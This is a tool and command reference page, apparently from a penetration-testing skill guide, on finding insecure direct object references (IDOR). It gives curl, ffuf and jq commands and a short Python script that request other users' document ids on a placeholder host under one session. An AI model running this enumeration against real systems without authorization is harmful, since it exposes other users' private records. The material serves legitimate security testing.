# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`authorization-and-idor`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `Burp Autorize` | `Set a low-privilege session as the comparison context and replay browsed requests` | Auto-compare authorized versus unauthorized responses per request to surface missing checks | Cross-platform |
| `curl` | `curl -s -o /dev/null -w '%{http_code} %{size_download}' https://target.example/api/documents/2002 -H 'Cookie: session=A'` | Capture status and size for a neighbour object under one session | Cross-platform |
| `ffuf` | `ffuf -w ids.txt -u https://target.example/api/documents/FUZZ -H 'Cookie: session=A' -mc 200` | Enumerate which object ids are readable under a single session | Cross-platform |
| `jq` | `jq .owner_id <(curl -s https://target.example/api/documents/2002 -H "Cookie: session=A")` | Confirm the returned record owner differs from the authenticated caller | Cross-platform |

## Minimal Script Shape

A two-object differential: it reads the caller's own object and a neighbour object under one session, then reports an IDOR when the neighbour returns data.

```python
import urllib.error
import urllib.request

BASE = "https://target.example/api/documents/"

def get(doc_id, cookie):
    req = urllib.request.Request(BASE + str(doc_id), headers={"Cookie": cookie})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, len(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, 0

session = "session=<account-a>"
own = get(1001, session)
other = get(2002, session)
print({"own_object": own, "other_object": other,
       "idor": other[0] == 200 and other[1] > 0})
```
